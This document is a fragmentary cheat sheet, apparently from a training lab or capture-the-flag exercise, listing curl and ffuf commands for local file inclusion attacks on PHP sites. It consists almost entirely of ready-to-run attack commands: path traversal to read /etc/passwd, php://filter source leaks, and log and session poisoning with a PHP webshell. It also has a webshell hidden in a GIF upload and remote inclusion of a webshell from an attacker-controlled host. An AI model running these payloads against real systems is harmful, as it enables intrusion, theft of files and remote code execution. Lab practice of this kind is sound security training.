...
curl "http://$BoxIP/contact.php?region=%252E%252E%252Fuploads%252Fshell.php&cmd=id"
...
curl -k "https://$BoxIP/vulnerable.php?param=../../../../../../etc/passwd%00"
```
...
curl "http://$BoxIP/index.php?page=php://filter/read=convert.base64-encode/resource=configure"
# Decode: echo -n 'BASE64STRING' | base64 -d

# Extract base64 cleanly from HTML-wrapped response (grep/sed pipeline)
curl -s 'http://$BoxIP/index.php?page=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini' \
    | grep "W1BI" \
    | sed 's/ \{12\}//g' \
...
ffuf -s -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
     -u http://$BoxIP:$Port/FUZZ.php
# Then: ?page=php://filter/read=convert.base64-encode/resource=$BoxDir
```
...
# Execute commands
curl -s 'http://$BoxIP/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep -v "<.*>"
...
curl "http://$BoxIP/index.php?page=/var/log/apache2/access.log&cmd=id"

# Multi-word commands: URL-encode spaces as %20 or use IFS trick
curl "http://$BoxIP/index.php?page=/var/log/apache2/access.log&cmd=ls%20-la"
curl "http://$BoxIP/index.php?page=/var/log/apache2/access.log&cmd=ls\${IFS}-la"
...
curl "http://$BoxIP/index.php?page=/var/lib/php/sessions/sess_PHPSESSID_VALUE"

# 3. Identify which URL parameter controls a session field (test by setting unique value)
# 4. Poison with URL-encoded webshell:
curl "http://$BoxIP/index.php?page=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E"
#   Decoded: <?php system($_GET["cmd"]); ?>

# 5. Execute via LFI + session include:
curl "http://$BoxIP/index.php?page=/var/lib/php/sessions/sess_PHPSESSID_VALUE&cmd=id"
```
...
# Include via LFI:
curl -s -w "\n" 'http://$BoxIP/index.php?page=./profile_images/shell.gif&cmd=ls+/' | grep -v "<.*>"
# Note: GIF8 appears before command output — strip it when reading flag filenames

# Read the flag (also has GIF8 prefix):
curl -s 'http://$BoxIP/index.php?page=./profile_images/shell.gif&cmd=cat+/FLAGFILE.txt' | grep -v "<.*>"
```
...
curl -w "\n" -s 'http://$BoxIP/index.php?page=http://PWNIP:8000/webShell.php&cmd=ls+/' | grep -v "<.*>"
```
...
ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://$BoxIP:$Port/index.php?FUZZ=key'
# Note the dominant Size value (e.g. 2309) — that's the noise

# Second run with filter:
ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://$BoxIP:$Port/index.php?FUZZ=key' -fs 2309
...
ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u 'http://$BoxIP:$Port/index.php?view=FUZZ'

# Second run filtered:
ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u 'http://$BoxIP:$Port/index.php?view=FUZZ' -fs 1935
